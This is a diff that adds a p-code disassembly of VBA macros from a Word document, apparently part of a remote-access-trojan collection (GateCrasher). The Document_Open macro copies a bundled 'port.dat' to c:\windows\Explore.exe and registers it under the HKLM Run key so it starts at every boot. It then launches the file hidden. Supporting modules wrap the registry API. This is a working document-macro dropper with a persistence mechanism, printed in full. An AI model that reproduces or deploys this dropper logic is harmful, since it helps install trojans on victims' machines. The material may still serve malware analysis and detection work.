@@ -1,0 +1,423 @@
+' Processing file: ./malware/Ultimate-RAT-Collection-main/GateCrasher/GateCrasher 1.0/GateCrasher 1.0/port.doc
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 2436 bytes
+' Line #0:
+' 	FuncDefn (Private Sub Document_New())
+' Line #1:
+' Line #2:
+' 	EndSub 
+' Line #3:
+' Line #4:
+' 	FuncDefn (Private Sub Document_Open())
+' Line #5:
+' 	Dim 
+' 	VarDefn strString (As String)
+' Line #6:
+' 	QuoteRem 0x0000 0x000E "Ask for String"
+' Line #7:
+' 	LitStr 0x0016 "c:\windows\Explore.exe"
+' 	St strString 
+' Line #8:
+' 	QuoteRem 0x0000 0x0027 "Check to see if the user pressed cancel"
+' Line #9:
+' 	Ld strString 
+' 	LitStr 0x0000 ""
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ExitSub 
+' 	EndIf 
+' Line #10:
+' 	QuoteRem 0x0000 0x000D "Edit Registry"
+' Line #11:
+' 	Ld HKEY_LOCAL_MACHINE 
+' 	LitStr 0x002D "Software\Microsoft\Windows\CurrentVersion\Run"
+' 	LitStr 0x0007 "Explore"
+' 	Ld strString 
+' 	ArgsCall (Call) savestring 0x0004 
+' Line #12:
+' 	LitStr 0x0008 "port.dat"
+' 	LitStr 0x0016 "c:\windows\Explore.exe"
+' 	ArgsCall FileCopy 0x0002 
+' Line #13:
+' 	LitStr 0x0016 "c:\windows\Explore.exe"
+' 	Ld vbMinimizedNoFocus 
+' 	ArgsLd Shell 0x0002 
+' 	St X 
+' Line #14:
+' Line #15:
+' 	EndSub 
+' Macros/VBA/Module1 - 8766 bytes
+' Line #0:
+' 	QuoteRem 0x0000 0x0012 " -----------------"
+' Line #1:
+' 	QuoteRem 0x0000 0x0009 " ADVAPI32"
+' Line #2:
+' 	QuoteRem 0x0000 0x0012 " -----------------"
+' Line #3:
+' 	QuoteRem 0x0000 0x0035 " function prototypes, constants, and type definitions"
+' Line #4:
+' 	QuoteRem 0x0000 0x0020 " for Windows 32-bit Registry API"
+' Line #5:
+' Line #6:
+' 	Dim (Public Const) 
+' 	LitHI4 0x0000 0x8000 
+' 	VarDefn HKEY_CLASSES_ROOT
+' Line #7:
+' 	Dim (Public Const) 
+' 	LitHI4 0x0001 0x8000 
+' 	VarDefn HKEY_CURRENT_USER
+' Line #8:
+' 	Dim (Public Const) 
+' 	LitHI4 0x0002 0x8000 
+' 	VarDefn HKEY_LOCAL_MACHINE
+' Line #9:
+' 	Dim (Public Const) 
+' 	LitHI4 0x0003 0x8000 
+' 	VarDefn HKEY_USERS
+' Line #10:
+' 	Dim (Public Const) 
+' 	LitHI4 0x0004 0x8000 
+' 	VarDefn HKEY_PERFORMANCE_DATA
+' Line #11:
+' 	Dim (Public Const) 
+' 	LitDI4 0x0000 0x0000 
+' 	VarDefn ERROR_SUCCESS
+' Line #12:
+' Line #13:
+' 	QuoteRem 0x0000 0x0018 " Registry API prototypes"
+' Line #14:
+' Line #15:
+' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal Hkey As Long) As Long)
+' Line #16:
+' 	FuncDefn (Declare Function RegCreateKey Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpSubKey As String, phkResult As Long) As Long)
+' Line #17:
+' 	FuncDefn (Declare Function RegDeleteKey Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpSubKey As String) As Long)
+' Line #18:
+' 	FuncDefn (Declare Function RegDeleteValue Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpValueName As String) As Long)
+' Line #19:
+' 	FuncDefn (Declare Function RegOpenKey Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpSubKey As String, phkResult As Long) As Long)
+' Line #20:
+' 	FuncDefn (Declare Function RegQueryValueEx Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As , lpcbData As Long) As Long)
+' Line #21:
+' 	FuncDefn (Declare Function RegSetValueEx Lib "advapi32.dll" (ByVal Hkey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As , ByVal cbData As Long) As Long)
+' Line #22:
+' 	Dim (Public Const) 
+' 	LitDI2 0x0001 
+' 	VarDefn REG_SZ
+' 	QuoteRem 0x0030 0x001E " Unicode nul terminated string"
+' Line #23:
+' 	Dim (Public Const) 
+' 	LitDI2 0x0004 
+' 	VarDefn REG_DWORD
+' 	QuoteRem 0x0030 0x000E " 32-bit number"
+' Line #24:
+' Line #25:
+' 	FuncDefn (Public Sub savekey(Hkey As Long, strPath As String))
+' Line #26:
+' 	Dim 
+' 	VarDefn keyhand
+' Line #27:
+' 	Ld Hkey 
+' 	Ld strPath 
+' 	Ld keyhand& 
+' 	ArgsLd RegCreateKey 0x0003 
+' 	St r 
+' Line #28:
+' 	Ld keyhand& 
+' 	ArgsLd RegCloseKey 0x0001 
+' 	St r 
+' Line #29:
+' 	EndSub 
+' Line #30:
+' Line #31:
+' 	FuncDefn (Public Function getstring(Hkey As Long, strPath As String, strValue As String))
+' Line #32:
+' Line #33:
+' 	Dim 
+' 	VarDefn keyhand (As Long)
+' Line #34:
+' 	Dim 
+' 	VarDefn datatype (As Long)
+' Line #35:
+' 	Dim 
+' 	VarDefn lResult (As Long)
+' Line #36:
+' 	Dim 
+' 	VarDefn strBuf (As String)
+' Line #37:
+' 	Dim 
+' 	VarDefn lDataBufSize (As Long)
+' Line #38:
+' 	Dim 
+' 	VarDefn intZeroPos (As Integer)
+' Line #39:
+' 	Ld Hkey 
+' 	Ld strPath 
+' 	Ld keyhand 
+' 	ArgsLd RegOpenKey 0x0003 
+' 	St r 
+' Line #40:
+' 	Ld keyhand 
+' 	Ld strValue 
+' 	LitDI4 0x0000 0x0000 
+' 	Ld lValueType 
+' 	LitDI4 0x0000 0x0000 
+' 	ParamByVal 
+' 	Ld lDataBufSize 
+' 	ArgsLd RegQueryValueEx 0x0006 
+' 	St lResult 
+' Line #41:
+' 	Ld lValueType 
+' 	Ld REG_SZ 
+' 	Eq 
+' 	IfBlock 
+' Line #42:
+' 	Ld lDataBufSize 
+' 	LitStr 0x0001 " "
+' 	ArgsLd String$ 0x0002 
+' 	St strBuf 
+' Line #43:
+' 	Ld keyhand 
+' 	Ld strValue 
+' 	LitDI4 0x0000 0x0000 
+' 	LitDI4 0x0000 0x0000 
+' 	Ld strBuf 
+' 	ParamByVal 
+' 	Ld lDataBufSize 
+' 	ArgsLd RegQueryValueEx 0x0006 
+' 	St lResult 
+' Line #44:
+' 	Ld lResult 
+' 	Ld ERROR_SUCCESS 
+' 	Eq 
+' 	IfBlock 
+' Line #45:
+' 	Ld strBuf 
+' 	LitDI2 0x0000 
+' 	ArgsLd Chr$ 0x0001 
+' 	FnInStr 
+' 	St intZeroPos 
+' Line #46:
+' 	Ld intZeroPos 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	IfBlock 
+' Line #47:
+' 	Ld strBuf 
+' 	Ld intZeroPos 
+' 	LitDI2 0x0001 
+' 	Sub 
+' 	ArgsLd LBound$ 0x0002 
+' 	St getstring 
+' Line #48:
+' 	ElseBlock 
+' Line #49:
+' 	Ld strBuf 
+' 	St getstring 
+' Line #50:
+' 	EndIfBlock 
+' Line #51:
+' 	EndIfBlock 
+' Line #52:
+' 	EndIfBlock 
+' Line #53:
+' 	EndFunc 
+' Line #54:
+' Line #55:
+' Line #56:
+' 	FuncDefn (Public Sub savestring(Hkey As Long, strPath As String, strValue As String, strdata As String))
+' Line #57:
+' 	Dim 
+' 	VarDefn keyhand (As Long)
+' Line #58:
+' 	Dim 
+' 	VarDefn r (As Long)
+' Line #59:
+' 	Ld Hkey 
+' 	Ld strPath 
+' 	Ld keyhand 
+' 	ArgsLd RegOpenKey 0x0003 
+' 	St r 
+' Line #60:
+' 	Ld keyhand 
+' 	Ld strValue 
+' 	LitDI2 0x0000 
+' 	Ld REG_SZ 
+' 	Ld strdata 
+' 	ParamByVal 
+' 	Ld strdata 
+' 	FnLen 
+' 	ArgsLd RegSetValueEx 0x0006 
+' 	St r 
+' Line #61:
+' 	Ld keyhand 
+' 	ArgsLd RegCloseKey 0x0001 
+' 	St r 
+' Line #62:
+' 	EndSub 
+' Line #63:
+' Line #64:
+' Line #65:
+' 	FuncDefn (Function getdword(ByVal Hkey As Long, ByVal strPath As String, ByVal strValueName As String) As Long)
+' Line #66:
+' 	Dim 
+' 	VarDefn lResult (As Long)
+' Line #67:
+' 	Dim 
+' 	VarDefn lValueType (As Long)
+' Line #68:
+' 	Dim 
+' 	VarDefn lBuf (As Long)
+' Line #69:
+' 	Dim 
+' 	VarDefn lDataBufSize (As Long)
+' Line #70:
+' 	Dim 
+' 	VarDefn r (As Long)
+' Line #71:
+' 	Dim 
+' 	VarDefn keyhand (As Long)
+' Line #72:
+' Line #73:
+' 	Ld Hkey 
+' 	Ld strPath 
+' 	Ld keyhand 
+' 	ArgsLd RegOpenKey 0x0003 
+' 	St r 
+' Line #74:
+' Line #75:
+' 	QuoteRem 0x0001 0x0015 " Get length/data type"
+' Line #76:
+' 	LitDI2 0x0004 
+' 	St lDataBufSize 
+' Line #77:
+' Line #78:
+' 	Ld keyhand 
+' 	Ld strValueName 
+' 	LitDI4 0x0000 0x0000 
+' 	Ld lValueType 
+' 	Ld lBuf 
+' 	Ld lDataBufSize 
+' 	ArgsLd RegQueryValueEx 0x0006 
+' 	St lResult 
+' Line #79:
+' Line #80:
+' 	Ld lResult 
+' 	Ld ERROR_SUCCESS 
+' 	Eq 
+' 	IfBlock 
+' Line #81:
+' 	Ld lValueType 
+' 	Ld REG_DWORD 
+' 	Eq 
+' 	IfBlock 
+' Line #82:
+' 	Ld lBuf 
+' 	St getdword 
+' Line #83:
+' 	EndIfBlock 
+' Line #84:
+' 	QuoteRem 0x0000 0x0004 "Else"
+' Line #85:
+' 	QuoteRem 0x0000 0x002D "    Call errlog("GetDWORD-" & strPath, False)"
+' Line #86:
+' 	EndIfBlock 
+' Line #87:
+' Line #88:
+' 	Ld keyhand 
+' 	ArgsLd RegCloseKey 0x0001 
+' 	St r 
+' Line #89:
+' Line #90:
+' 	EndFunc 
+' Line #91:
+' Line #92:
+' 	FuncDefn (Function SaveDword(ByVal Hkey As Long, ByVal strPath As String, ByVal strValueName As String, ByVal lData As Long))
+' Line #93:
+' 	Dim 
+' 	VarDefn lResult (As Long)
+' Line #94:
+' 	Dim 
+' 	VarDefn keyhand (As Long)
+' Line #95:
+' 	Dim 
+' 	VarDefn r (As Long)
+' Line #96:
+' 	Ld Hkey 
+' 	Ld strPath 
+' 	Ld keyhand 
+' 	ArgsLd RegCreateKey 0x0003 
+' 	St r 
+' Line #97:
+' 	Ld keyhand 
+' 	Ld strValueName 
+' 	LitDI4 0x0000 0x0000 
+' 	Ld REG_DWORD 
+' 	Ld lData 
+' 	LitDI2 0x0004 
+' 	ArgsLd RegSetValueEx 0x0006 
+' 	St lResult 
+' Line #98:
+' 	QuoteRem 0x0004 0x003F "If lResult <> error_success Then Call errlog("SetDWORD", False)"
+' Line #99:
+' 	Ld keyhand 
+' 	ArgsLd RegCloseKey 0x0001 
+' 	St r 
+' Line #100:
+' 	EndFunc 
+' Line #101:
+' Line #102:
+' 	FuncDefn (Public Function DeleteKey(ByVal Hkey As Long, ByVal strKey As String))
+' Line #103:
+' 	Dim 
+' 	VarDefn r (As Long)
+' Line #104:
+' 	Ld Hkey 
+' 	Ld strKey 
+' 	ArgsLd RegDeleteKey 0x0002 
+' 	St r 
+' Line #105:
+' 	EndFunc 
+' Line #106:
+' Line #107:
+' 	FuncDefn (Public Function DeleteValue(ByVal Hkey As Long, ByVal strPath As String, ByVal strValue As String))
+' Line #108:
+' 	Dim 
+' 	VarDefn keyhand (As Long)
+' Line #109:
+' 	Ld Hkey 
+' 	Ld strPath 
+' 	Ld keyhand 
+' 	ArgsLd RegOpenKey 0x0003 
+' 	St r 
+' Line #110:
+' 	Ld keyhand 
+' 	Ld strValue 
+' 	ArgsLd RegDeleteValue 0x0002 
+' 	St r 
+' Line #111:
+' 	Ld keyhand 
+' 	ArgsLd RegCloseKey 0x0001 
+' 	St r 
+' Line #112:
+' 	EndFunc 
+' Line #113:
+' Line #114:
+' Macros/VBA/Module2 - 1532 bytes
+' Line #0:
+' 	LineCont 0x0004 08 00 08 00
+' 	FuncDefn (Public Declare Function GetSystemDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
+' Line #1:
+' Line #2:
+' 	LineCont 0x0004 08 00 08 00
+' 	FuncDefn (Public Declare Function GetTempPath Lib "kernel32" (ByVal nSize As Long, ByVal lpBuffer As String) As Long)
+' Line #3:
+' Line #4:
+' 	LineCont 0x0004 08 00 08 00
+' 	FuncDefn (Public Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
+' Line #5:
+' Line #6:
+' Line #7:
+' Line #8:
